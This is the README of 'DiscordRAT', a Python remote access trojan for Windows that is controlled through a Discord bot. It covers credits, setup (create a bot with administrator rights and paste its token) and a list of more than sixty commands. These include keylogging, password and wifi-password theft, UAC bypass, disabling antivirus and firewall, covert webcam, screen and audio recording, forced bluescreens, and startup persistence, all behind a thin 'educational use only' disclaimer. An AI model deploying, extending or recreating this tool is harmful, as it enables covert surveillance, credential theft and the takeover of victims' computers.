# DiscordRAT

Discord Remote Administration Tool fully written in Python3.

This is a RAT controlled over Discord with multiple post-exploitation modules.


---

## Disclaimer

This tool is for educational use only.  
The author(s) will not be held responsible for any misuse of this tool.

---

## About

This repository is based on an already improved version of DiscordRAT.

The work done in this repository is limited to:
- Fixing bugs and issues
- Cleaning up small problems and inconsistencies
- Improving stability without adding new commands or modules

No new features or commands were introduced.

The **latest adjustments and maintenance** in this repository are done by me.

Further improvements may be made in the future.

---

## Credits

This project was originally made by:  
https://github.com/Sp00p64/DiscordRAT  

The original modules and the original README.md were created by him.  
Credit goes to him for all the original work.

The project was later improved and modified by:  
https://github.com/moom825/Discord-RAT  

This repository is based on that improved version, with some issues resolved.

---

## Setup Guide

You will first need to register a bot with the Discord developer portal and then add the bot to the Discord server that you want to use to control the bot (make sure the bot has administrator privileges in the Discord server).

Once the bot is created, copy the token of your bot and paste it at line 20.

---
#^# Commands

!message

!shell

!webcampic

!windowstart

!windowstop

!voice

!admincheck

!sysinfo

!history

!download

!upload

!cd

!delete

!write

!wallpaper

!clipboard

!geolocate

!startkeylogger

!stopkeylogger

!dumpkeylogger

!volumemax

!volumezero

!idletime

!blockinput

!unblockinput

!screenshot

!exit

!kill

!uacbypass

!passwords

!streamwebcam

!stopwebcam

!getdiscordinfo

!streamscreen

!stopscreen

!shutdown

!restart

!logoff

!bluescreen

!displaydir

!currentdir

!dateandtime

!prockill

!recscreen

!reccam

!recaudio

!disableantivirus

!disablefirewall

!audio

!selfdestruct

!windowspass

!displayoff

!displayon

!hide

!unhide

!ejectcd

!retractcd

!critproc

!uncritproc

!website

!distaskmgr

!enbtaskmgr

!getwifipass

!startup

---

## Requirements

- Python 3
- Windows (x64)

A `requirements.txt` file is included.  
Its contents are taken from the referenced upstream repository and were **not modified** in this version.

---

## Install requirements

```bash
pip3 install -r requirements.txt

